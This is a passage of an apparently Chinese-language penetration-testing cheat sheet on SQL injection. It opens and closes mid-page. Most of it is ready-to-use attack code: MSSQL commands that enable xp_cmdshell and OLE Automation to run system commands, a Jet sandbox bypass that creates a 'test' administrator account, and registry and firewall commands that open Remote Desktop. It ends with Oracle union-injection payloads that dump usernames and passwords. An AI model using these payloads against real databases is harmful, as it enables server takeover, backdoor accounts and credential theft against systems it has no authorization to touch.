<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">exec</span> xp getnetname
</span></span></code></pre></td></tr></table>
</div>
</div><p>获取系统信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">exec</span> xp_msver
</span></span></code></pre></td></tr></table>
</div>
</div><p>获取驱动器信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">exec</span> xp_fixeddrives
</span></span></code></pre></td></tr></table>
</div>
</div><p>获取域名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SELECT DEFAULT_DOMAIN<span class="o">(</span> <span class="o">)</span> as mydomain<span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>遍历域用户</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">先获取RID
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SELECT SUSER_SID<span class="o">(</span><span class="s1">&#39;CATE4CAFE\Domain Admins&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">采用循环SQL语句遍历即可遍历出所有域用户。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#或者使用</span>
</span></span><span class="line"><span class="cl">https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Get-SqlServer-Enum-WinAccounts.psm1
</span></span></code></pre></td></tr></table>
</div>
</div><p>msf有个模块可以通过注入点枚举域用户</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary admin mssql/mssql_enum_domain_accounts_sali
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="命令执行提权">命令执行&amp;提权</h2>
<h3 id="xp_cmdshell">xp_cmdshell</h3>
<p>xp_cmdshell(SQLServer 2005之后默认禁用)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 启用xp_cmdshell：</span>
</span></span><span class="line"><span class="cl">use master<span class="p">;</span>
</span></span><span class="line"><span class="cl">EXEC sp_configure <span class="s1">&#39;show advanced options&#39;</span>, <span class="m">1</span>
</span></span><span class="line"><span class="cl">RECONFIGURE<span class="p">;</span>
</span></span><span class="line"><span class="cl">EXEC sp_configure <span class="s1">&#39;xp_cmdshell&#39;</span>, 1<span class="p">;</span>
</span></span><span class="line"><span class="cl">RECONFIGURE<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#执行命令</span>
</span></span><span class="line"><span class="cl">EXEC xp_cmdshell <span class="s2">&#34;net user&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">EXEC master.dbo.xp_cmdshell <span class="s1">&#39;cmd.exe dir c:&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">EXEC master.dbo.xp_cmdshell <span class="s1">&#39;ping 127.0.0.1&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 关闭xp_cmdshell：</span>
</span></span><span class="line"><span class="cl"><span class="nb">exec</span> sp_configure <span class="s1">&#39;show advanced options&#39;</span>, 1<span class="p">;</span>
</span></span><span class="line"><span class="cl">reconfigure<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">exec</span> sp_configure <span class="s1">&#39;xp_cmdshell&#39;</span>, 0<span class="p">;</span>
</span></span><span class="line"><span class="cl">reconfigure<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 执行whoami  查看得到的权限是(如果是高权限就..., 如果是network service 权限--&gt;就想别的办法)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复(xplog70.dll可以自己本地安装然后复制出来)</span>
</span></span><span class="line"><span class="cl"><span class="nb">exec</span> master.sys.sp_addextendedproc <span class="s1">&#39;xp_cmdshell&#39;</span>, <span class="s1">&#39;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="sp_oacreate">sp_oacreate</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 启用：</span>
</span></span><span class="line"><span class="cl">EXEC sp_configure <span class="s1">&#39;show advanced options&#39;</span>, 1<span class="p">;</span>   
</span></span><span class="line"><span class="cl">RECONFIGURE WITH OVERRIDE<span class="p">;</span>   
</span></span><span class="line"><span class="cl">EXEC sp_configure <span class="s1">&#39;Ole Automation Procedures&#39;</span>, 1<span class="p">;</span>   
</span></span><span class="line"><span class="cl">RECONFIGURE WITH OVERRIDE<span class="p">;</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 关闭：</span>
</span></span><span class="line"><span class="cl">EXEC sp_configure <span class="s1">&#39;show advanced options&#39;</span>, 0<span class="p">;</span>
</span></span><span class="line"><span class="cl">RECONFIGURE WITH OVERRIDE<span class="p">;</span>   
</span></span><span class="line"><span class="cl">EXEC sp_configure <span class="s1">&#39;Ole Automation Procedures&#39;</span>, 0<span class="p">;</span>   
</span></span><span class="line"><span class="cl">RECONFIGURE WITH OVERRIDE<span class="p">;</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 执行： </span>
</span></span><span class="line"><span class="cl"><span class="c1"># 这个也可以上传一个木马</span>
</span></span><span class="line"><span class="cl"><span class="nb">declare</span> @shell int <span class="nb">exec</span> sp_oacreate <span class="s1">&#39;wscript.shell&#39;</span>,@shell output <span class="nb">exec</span> sp_oamethod @shell,<span class="s1">&#39;run&#39;</span>,null,<span class="s1">&#39;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 针对无回显，就可以输出到txt文件：把系统命令执行结果输出到1.txt</span>
</span></span><span class="line"><span class="cl"><span class="c1">#以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="sql-server-clr">SQL Server CLR</h3>
<p>CLR有点繁琐，参考文章：https://www.cnblogs.com/wh4am1/p/11669539.html</p>
<h3 id="sql-server-沙盒">SQL Server 沙盒</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">exec</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">;</span><span class="n">reconfigure</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">-- 不开启的话在执行xp_regwrite会提示让我们开启，
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">exec</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;Ad Hoc Distributed Queries&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">;</span><span class="n">reconfigure</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">-- 关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">exec</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_regwrite</span><span class="w"> </span><span class="s1">&#39;HKEY_LOCAL_MACHINE&#39;</span><span class="p">,</span><span class="s1">&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;</span><span class="p">,</span><span class="s1">&#39;SandBoxMode&#39;</span><span class="p">,</span><span class="s1">&#39;REG_DWORD&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">-- 查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">exec</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">xp_regread</span><span class="w"> </span><span class="s1">&#39;HKEY_LOCAL_MACHINE&#39;</span><span class="p">,</span><span class="s1">&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SandBoxMode&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">-- 执行系统命令
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">openrowset</span><span class="p">(</span><span class="s1">&#39;microsoft.jet.oledb.4.0&#39;</span><span class="p">,</span><span class="s1">&#39;;database=c:/windows/system32/ias/ias.mdb&#39;</span><span class="p">,</span><span class="s1">&#39;select shell(&#34;net user test test /add&#34;)&#39;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">openrowset</span><span class="p">(</span><span class="s1">&#39;microsoft.jet.oledb.4.0&#39;</span><span class="p">,</span><span class="s1">&#39;;database=c:/windows/system32/ias/ias.mdb&#39;</span><span class="p">,</span><span class="s1">&#39;select shell(&#34;net localgroup administrators test /add&#34;)&#39;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">沙盒模式</span><span class="n">SandBoxMode</span><span class="err">参数含义（默认是</span><span class="mi">2</span><span class="err">）</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">`</span><span class="mi">0</span><span class="o">`</span><span class="err">：在任何所有者中禁止启用安全模式</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">`</span><span class="mi">1</span><span class="o">`</span><span class="w"> </span><span class="err">：为仅在允许范围内</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">`</span><span class="mi">2</span><span class="o">`</span><span class="w"> </span><span class="err">：必须在</span><span class="n">access</span><span class="err">模式下</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">`</span><span class="mi">3</span><span class="o">`</span><span class="err">：完全开启</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">openrowset</span><span class="err">是可以通过</span><span class="n">OLE</span><span class="w"> </span><span class="n">DB</span><span class="err">访问</span><span class="k">SQL</span><span class="w"> </span><span class="n">Server</span><span class="err">数据库，</span><span class="n">OLE</span><span class="w"> </span><span class="n">DB</span><span class="err">是应用程序链接到</span><span class="k">SQL</span><span class="w"> </span><span class="n">Server</span><span class="err">的的驱动程序。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">-- 恢复配置
</span></span></span><span class="line"><span class="cl"><span class="c1">-- exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,1;
</span></span></span><span class="line"><span class="cl"><span class="c1">-- exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,0;reconfigure;
</span></span></span><span class="line"><span class="cl"><span class="c1">-- exec sp_configure &#39;show advanced options&#39;,0;reconfigure;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>sql server常用操作远程桌面语句:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 1.查看是否开启远程桌面,1表示关闭,0表示开启</span>
</span></span><span class="line"><span class="cl">EXEC master..xp_regread <span class="s1">&#39;HKEY_LOCAL_MACHINE&#39;</span>,<span class="s1">&#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39;</span>,<span class="s1">&#39;fDenyTSConnections&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 2.读取远程桌面端口</span>
</span></span><span class="line"><span class="cl">EXEC master..xp_regread <span class="s1">&#39;HKEY_LOCAL_MACHINE&#39;</span>,<span class="s1">&#39;SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&#39;</span>,<span class="s1">&#39;PortNumber&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 3.开启远程桌面</span>
</span></span><span class="line"><span class="cl">EXEC master.dbo.xp_regwrite<span class="s1">&#39;HKEY_LOCAL_MACHINE&#39;</span>,<span class="s1">&#39;SYSTEM\CurrentControlSet\Control\Terminal
</span></span></span><span class="line"><span class="cl"><span class="s1">Server&#39;</span>,<span class="s1">&#39;fDenyTSConnections&#39;</span>,<span class="s1">&#39;REG_DWORD&#39;</span>,0<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#reg文件开启远程桌面:</span>
</span></span><span class="line"><span class="cl">Windows Registry Editor Version 5.00HKEY_LOCAL_MACHINE<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\T</span>erminal
</span></span><span class="line"><span class="cl">Server<span class="o">]</span><span class="s2">&#34;fDenyTSConnections&#34;</span><span class="o">=</span>dword:00000000<span class="o">[</span>HKEY_LOCAL_MACHINE<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\T</span>erminal
</span></span><span class="line"><span class="cl">Server<span class="se">\W</span>inStations<span class="se">\R</span>DP-Tcp<span class="o">]</span><span class="s2">&#34;PortNumber&#34;</span><span class="o">=</span>dword:00000d3d
</span></span><span class="line"><span class="cl"><span class="c1">#保存micropoor.reg,并执行regedit /s micropoor.reg</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#注:如果第一次开启远程桌面,部分需要配置防火墙规则允许远程端口。</span>
</span></span><span class="line"><span class="cl">netsh advfirewall firewall add rule <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;Remote Desktop&#34;</span> <span class="nv">protocol</span><span class="o">=</span>TCP <span class="nv">dir</span><span class="o">=</span>in <span class="nv">localport</span><span class="o">=</span><span class="m">3389</span> <span class="nv">action</span><span class="o">=</span>allow
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 4.关闭远程桌面</span>
</span></span><span class="line"><span class="cl">EXEC master.dbo.xp_regwrite<span class="s1">&#39;HKEY_LOCAL_MACHINE&#39;</span>,<span class="s1">&#39;SYSTEM\CurrentControlSet\Control\Terminal
</span></span></span><span class="line"><span class="cl"><span class="s1">Server&#39;</span>,<span class="s1">&#39;fDenyTSConnections&#39;</span>,<span class="s1">&#39;REG_DWORD&#39;</span>,1<span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="oraclesql注入">OracleSQL注入</h1>
<h2 id="注入流程-2">注入流程</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#1.判断数据库为oracle</span>
</span></span><span class="line"><span class="cl">提交注释字符/*，返回正常即是MySQL，否则继续提交注释符号--，该符号是Oracle和MSSQL支持的注释符，返回正常就需要继续判断。
</span></span><span class="line"><span class="cl">可以继续提交多语句支持符号<span class="p">;</span> 如果支持多行查询，说明是MSSQL，因为Oracle不支持多行查询，可以继续提交查询语句：
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#oracle：独有的虚拟表 dual：    </span>
</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="k">select</span> count<span class="o">(</span>*<span class="o">)</span> from dual<span class="o">)</span>&lt;&gt;0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#2.order by 定字段</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Union联合查询：</span>
</span></span><span class="line"><span class="cl"><span class="c1">#3.一个一个去判断字段类型</span>
</span></span><span class="line"><span class="cl">union <span class="k">select</span> null,null from dual
</span></span><span class="line"><span class="cl"><span class="c1">#确定是str型的</span>
</span></span><span class="line"><span class="cl"><span class="nv">id</span><span class="o">=</span>-1%20union%20select%20%27a%27,%27null%27%20from%20dual
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#4.数据库</span>
</span></span><span class="line"><span class="cl">union%20select%20<span class="o">(</span><span class="k">select</span>%20instance_name%20from%20v<span class="nv">$instance</span><span class="o">)</span>,%272%27%20from%20dual
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#5.爆数据表</span>
</span></span><span class="line"><span class="cl">union <span class="k">select</span> <span class="o">(</span><span class="k">select</span> table_name from all_tables where <span class="nv">rownum</span><span class="o">=</span><span class="m">1</span> and table_name like  <span class="s1">&#39;%user%&#39;</span><span class="o">)</span>,<span class="s1">&#39;2&#39;</span> from dual
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#6.爆字段名</span>
</span></span><span class="line"><span class="cl">第一个字段
</span></span><span class="line"><span class="cl"> union <span class="k">select</span> <span class="s1">&#39;1&#39;</span>,<span class="o">(</span><span class="k">select</span> column_name from all_tab_columns where <span class="nv">rownum</span><span class="o">=</span><span class="m">1</span> and <span class="nv">table_name</span><span class="o">=</span><span class="s1">&#39;sns_users&#39;</span><span class="o">)</span> from dual
</span></span><span class="line"><span class="cl">第二个字段
</span></span><span class="line"><span class="cl">union <span class="k">select</span> <span class="s1">&#39;1&#39;</span>,<span class="o">(</span><span class="k">select</span> column_name from all_tab_columns where <span class="nv">rownum</span><span class="o">=</span><span class="m">1</span> and <span class="nv">table_name</span><span class="o">=</span><span class="s1">&#39;sns_users&#39;</span> and column_name &lt;&gt; <span class="s1">&#39;user_name&#39;</span><span class="o">)</span> from dual
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#7.爆数据</span>
</span></span><span class="line"><span class="cl"><span class="c1">#爆某表中的第一行数据：</span>
</span></span><span class="line"><span class="cl">union <span class="k">select</span> 1,字段1<span class="o">||</span>字段2...<span class="o">||</span>字段n from 表名 where <span class="nv">rownum</span><span class="o">=</span><span class="m">1</span> --
</span></span><span class="line"><span class="cl">第一个
</span></span><span class="line"><span class="cl">union <span class="k">select</span> user_name,user_pwd from <span class="s2">&#34;sns_users&#34;</span> 
</span></span><span class="line"><span class="cl">第二个
</span></span><span class="line"><span class="cl">union <span class="k">select</span> user_name,user_pwd from <span class="s2">&#34;sns_users&#34;</span>  where user_name &lt;&gt; <span class="s1">&#39;hu&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="常用查询">常用查询</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 查看数据库版本</span>
</span></span><span class="line"><span class="cl">SELECT user FROM dual UNION SELECT * FROM v<span class="nv">$version</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 查看当前用户：</span>
</span></span><span class="line"><span class="cl">SELECT user FROM dual<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 列出所有用户：</span>
</span></span><span class="line"><span class="cl">SELECT username FROM all_users ORDER BY username<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 列出数据库</span>
</span></span><span class="line"><span class="cl">SELECT DISTINCT owner FROM all_tables<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 列出表名：</span>
</span></span><span class="line"><span class="cl">SELECT table_name FROM all_tables<span class="p">;</span>
</span></span><span class="line"><span class="cl">SELECT owner, table_name FROM all_tables<span class="p">;</span>
</span></span><span class="line"><span class="cl">SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE <span class="s1">&#39;%PASS%&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 列出字段名：</span>
</span></span><span class="line"><span class="cl">SELECT column_name FROM all_tab_columns WHERE <span class="nv">table_name</span> <span class="o">=</span> ‘blah’<span class="p">;</span>
</span></span><span class="line"><span class="cl">SELECT column_name FROM all_tab_columns WHERE <span class="nv">table_name</span> <span class="o">=</span> ‘blah’ and <span class="nv">owner</span> <span class="o">=</span> ‘foo’<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 定位DB文件：</span>
</span></span><span class="line"><span class="cl">SELECT name FROM V<span class="nv">$DATAFILE</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="联合注入-2">联合注入</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select user,null from dual--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=-1&#39; union select version,null from v$instance--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=-1&#39; union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=-1&#39; union select column_name,null from (select * from (select rownum as limit,column_name from user_tab_columns where table_name =&#39;USERS&#39;) where limit=2)--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=-1&#39; union select username,passwd from users--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=-1&#39; union select username,passwd from (select * from (select username,passwd,rownum as limit from users) where limit=3)--
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="heading"></h3>
<h2 id="报错注入-2">报错注入</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
